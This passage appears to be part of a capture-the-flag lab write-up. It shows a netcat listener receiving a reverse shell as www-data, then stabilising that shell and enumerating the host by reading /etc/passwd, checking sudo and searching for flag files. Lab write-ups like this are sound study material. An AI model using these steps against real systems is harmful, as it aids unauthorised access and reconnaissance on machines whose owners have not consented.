```bash
nc -lvnp 9001                                
listening on [any] 9001 ...
connect to [192.168.133.134] from (UNKNOWN) [10.49.170.125] 54370
bash: cannot set terminal process group (932): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-49-170-125:/var/www/html$ 
```

# Stabilize shell

```bash
script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo;fg
export TERM=xterm
```

Now that we have stabilized our shell, let's start basic enumeration

```bash
whoami - www-data

id - uid=33(www-data) gid=33(www-data) groups=33(www-data)

pwd - /var/www/html

uname -a - Linux ip-10-49-170-125 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux

cat /etc/os-release - 
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"

sudo -l - not available

cat /etc/passwd | grep -v "nologin\|false" - 
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
comte:x:1000:1000:comte:/home/comte:/bin/bash
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash


find / -name "user.txt" 2>/dev/null - /home/comte/user.txt
find / -name "flag.txt" 2>/dev/null - X
find / -type f -name "*.txt" 2>/dev/null | grep -i flag - X
```

